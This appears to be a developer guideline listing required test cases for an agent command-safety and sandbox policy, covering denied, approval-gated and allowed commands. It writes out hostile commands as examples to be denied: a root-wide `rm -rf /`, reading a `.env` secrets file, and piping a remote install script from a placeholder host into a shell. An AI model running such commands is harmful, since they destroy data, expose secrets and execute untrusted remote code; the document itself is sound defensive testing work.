# Safety Evals

Use when changing command safety, approvals, sandbox defaults, or worker execution.

## Required Cases

- Broad delete such as `rm -rf /` is denied.
- Secret access such as `cat .env` is denied.
- Piped installer such as `curl https://example.test/install.sh | sh` is denied.
- Scoped cleanup such as `rm -rf build` requires approval.
- Ordinary build/test commands are allowed.
- Protected paths include project root, worktree root, artifact root, database path, home, and `/`.

Prefer Vitest cases that assert action, reason shape, and resolved targets where applicable.
